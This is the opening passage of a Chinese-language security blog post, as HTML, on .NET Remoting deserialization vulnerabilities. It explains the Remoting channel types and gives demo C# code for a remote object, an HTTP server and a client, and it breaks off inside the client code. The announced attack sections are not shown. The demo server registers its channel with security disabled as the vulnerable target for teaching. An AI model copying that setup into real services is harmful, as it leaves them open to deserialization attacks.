@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Dot NET-.NET Remoting反序列化漏洞 - N1Rvana&#39;s Blog</title><meta name="author" content="N1Rvana">
+<meta name="description" content="Web Security"><meta name="keywords" content='.NET Remoting'>
+  <meta itemprop="name" content="Dot NET-.NET Remoting反序列化漏洞">
+  <meta itemprop="description" content="Web Security">
+  <meta itemprop="datePublished" content="2025-06-07T00:37:05+08:00">
+  <meta itemprop="dateModified" content="2025-06-07T00:37:05+08:00">
+  <meta itemprop="wordCount" content="1941">
+  <meta itemprop="image" content="https://nlrvana.github.io/avatar.png">
+  <meta itemprop="keywords" content=".NET Remoting"><meta property="og:url" content="https://nlrvana.github.io/dot-net-.net-remoting%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+  <meta property="og:site_name" content="N1Rvana&#39;s Blog">
+  <meta property="og:title" content="Dot NET-.NET Remoting反序列化漏洞">
+  <meta property="og:description" content="Web Security">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-06-07T00:37:05+08:00">
+    <meta property="article:modified_time" content="2025-06-07T00:37:05+08:00">
+    <meta property="article:tag" content=".NET Remoting">
+    <meta property="og:image" content="https://nlrvana.github.io/avatar.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://nlrvana.github.io/avatar.png">
+  <meta name="twitter:title" content="Dot NET-.NET Remoting反序列化漏洞">
+  <meta name="twitter:description" content="Web Security">
+      <meta name="twitter:site" content="@huahua39079406">
+<meta name="twitter:creator" content="@huahua39079406" /><meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://nlrvana.github.io/dot-net-.net-remoting%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Dot NET-.NET Remoting反序列化漏洞 - N1Rvana&#39;s Blog" /><link rel="prev" type="text/html" href="https://nlrvana.github.io/dot-net-json.net%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Dot NET-Json.Net反序列化漏洞" /><link rel="alternate" type="text/markdown" href="https://nlrvana.github.io/dot-net-.net-remoting%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.md" title="Dot NET-.NET Remoting反序列化漏洞 - N1Rvana's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Dot NET-.NET Remoting反序列化漏洞",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/nlrvana.github.io\/dot-net-.net-remoting%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E\/"
+    },"genre": "posts","keywords": ".NET Remoting","wordcount":  1941 ,
+    "url": "https:\/\/nlrvana.github.io\/dot-net-.net-remoting%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E\/","datePublished": "2025-06-07T00:37:05+08:00","dateModified": "2025-06-07T00:37:05+08:00","license": "Web Security","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "N1Rvana"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item has-children">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="关键词搜索" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="关键词搜索" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><span class="nested-item">
+                  <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a>
+                  <i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden="true"></i>
+                </span>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item" data-separator="/"><a href="/" title="N1Rvana&#39;s Blog">Home</a></li><li class="breadcrumb-item" data-separator="/"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" data-separator="/" aria-current="page">Dot NET-.NET Remoting反序列化漏洞</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>Dot NET-.NET Remoting反序列化漏洞</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/avatar.png" alt="N1Rvana" data-title="N1Rvana" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;N1Rvana</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/.net/" class="post-category" title="Category - .NET"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> .NET</a></span></div><div class="post-meta-line"><span title="published on 2025-06-07 00:37:05"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-06-07">2025-06-07</time></span>&nbsp;<span title="1941 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 2000 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>4 minutes</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="Dot NET-.NET Remoting反序列化漏洞"><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_page_pv">-</span>&nbsp;views
+          </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#net-remoting基础">.NET Remoting基础</a></li>
+    <li><a href="#net-remoting信道和协议">.NET Remoting信道和协议</a></li>
+    <li><a href="#net-remoting-demo">.NET Remoting Demo</a>
+      <ul>
+        <li><a href="#传输对象类">传输对象类</a></li>
+        <li><a href="#服务端">服务端</a></li>
+        <li><a href="#客户端">客户端</a></li>
+        <li><a href="#httpserverchannel数据包">HttpServerChannel数据包</a></li>
+        <li><a href="#漏洞是如何产生的">漏洞是如何产生的？</a></li>
+        <li><a href="#攻击httpserverchannel">攻击HttpServerChannel</a></li>
+        <li><a href="#tcpserverchannel">TCPServerChannel</a></li>
+        <li><a href="#攻击tcpserverchannel">攻击TcpServerChannel</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="net-remoting基础" class="heading-element"><span>.NET Remoting基础</span>
+  <a href="#net-remoting%e5%9f%ba%e7%a1%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>.NET Remoting是一个分布式应用解决方案，它允许不同<code>AppDomain(应用程序域)</code>之间进行通信，这里的通信可以是在同一个进程中进行或者一个系统中的不同进程间进行的通信。.NET Remoting框架也提供了多种服务，包括激活和生存期支持，以及负责与远程应用程序进行消息传输的通道。应用程序可在重视性能的场景下使用二进制数据传输，在需要与其他远程处理框架进行交互的场景下使用 XML 数据传输。在从一个AppDomain向另一个AppDomain传输消息时，所有的XML数据都使用 SOAP 协议。</p>
+<h2 id="net-remoting信道和协议" class="heading-element"><span>.NET Remoting信道和协议</span>
+  <a href="#net-remoting%e4%bf%a1%e9%81%93%e5%92%8c%e5%8d%8f%e8%ae%ae" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>信道是Server和Client进行通信的，在.NET Remoting中提供了三种信道类型。<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506051133352.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506051133352.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506051133352.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506051133352.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506051133352.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506051133352.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+其中不同协议用处不同</p>
+<ul>
+<li>IpcChannel用于本机之间进程传输，使用IPC协议传输比HTTP、TCP速度要快，但是只能在本机传输，不能跨机器。</li>
+<li>TcpChannel基于TCP传输，将对象进行二进制序列化之后传输二进制数据流，比http传输效率更高。</li>
+<li>HttpChannel基于HTTP传输，将对象进行soap序列化之后在网络中传输xml，兼容性更强。</li>
+</ul>
+<h2 id="net-remoting-demo" class="heading-element"><span>.NET Remoting Demo</span>
+  <a href="#net-remoting-demo" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>以<code>HttpChannel</code>为例，</p>
+<ul>
+<li>RemoteDemoClient</li>
+<li>RemoteDemoServer</li>
+<li>RemoteObject</li>
+</ul>
+<p>分别表示客户端、服务端和要传输的对象。</p>
+<h3 id="传输对象类" class="heading-element"><span>传输对象类</span>
+  <a href="#%e4%bc%a0%e8%be%93%e5%af%b9%e8%b1%a1%e7%b1%bb" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>RemoteDemoObject.RemoteDemoObjectClass需要继承<code>MarshalByRefObject</code>类才能跨域(AppDomain)远程传输。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">RemoteDemoObject</span>  
+</span></span><span class="line"><span class="cl"><span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="k">class</span> <span class="nc">RemoteDemoObjectClass</span><span class="p">:</span><span class="n">MarshalByRefObject</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">int</span> <span class="n">count</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">int</span> <span class="n">GetCount</span><span class="p">()</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;GetCount called.&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">count</span><span class="p">++;</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="服务端" class="heading-element"><span>服务端</span>
+  <a href="#%e6%9c%8d%e5%8a%a1%e7%ab%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>服务端注册HttpServerChannel并绑定在9999端口，然后<code>RemotingConfiguration.RegisterWellKnownServiceType</code>发布uri地址为<code>RemoteObjectClass.rem</code>的远程调用对象，类型是<code>RemoteDemoObjectClass</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Remoting</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Remoting.Channels</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Remoting.Channels.Http</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">RemoteDemoObject</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">RemoteDemoServer</span>  
+</span></span><span class="line"><span class="cl"><span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Program</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>   
+</span></span><span class="line"><span class="cl">        <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">HttpServerChannel</span> <span class="n">httpServerChannel</span> <span class="p">=</span> <span class="k">new</span> <span class="n">HttpServerChannel</span><span class="p">(</span><span class="m">9999</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">ChannelServices</span><span class="p">.</span><span class="n">RegisterChannel</span><span class="p">(</span><span class="n">httpServerChannel</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">RemotingConfiguration</span><span class="p">.</span><span class="n">RegisterWellKnownServiceType</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">RemoteDemoObjectClass</span><span class="p">),</span> <span class="s">&#34;RemoteDemoObjectClass.rem&#34;</span><span class="p">,</span> <span class="n">WellKnownObjectMode</span><span class="p">.</span><span class="n">Singleton</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;server has been start&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">ReadKey</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="客户端" class="heading-element"><span>客户端</span>
+  <a href="#%e5%ae%a2%e6%88%b7%e7%ab%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Collections.Generic</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Linq</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Threading.Tasks</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">RemoteDemoObject</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">RemoteDemoClient</span>  
+</span></span><span class="line"><span class="cl"><span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Program</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">             <span class="kt">string</span> <span class="n">serverAddress</span> <span class="p">=</span> <span class="s">&#34;http://localhost:9999/RemoteDemoObjectClass.rem&#34;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">             <span class="n">RemoteDemoObjectClass</span> <span class="n">obj1</span> <span class="p">=</span> <span class="p">(</span><span class="n">RemoteDemoObjectClass</span><span class="p">)</span><span class="n">Activator</span><span class="p">.</span><span class="n">GetObject</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">RemoteDemoObjectClass</span><span class="p">),</span> <span class="n">serverAddress</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;call GetCount() get return value:{0}&#34;</span><span class="p">,</span><span class="n">obj1</span><span class="p">.</span><span class="n">GetCount</span><span class="p">());</span>  
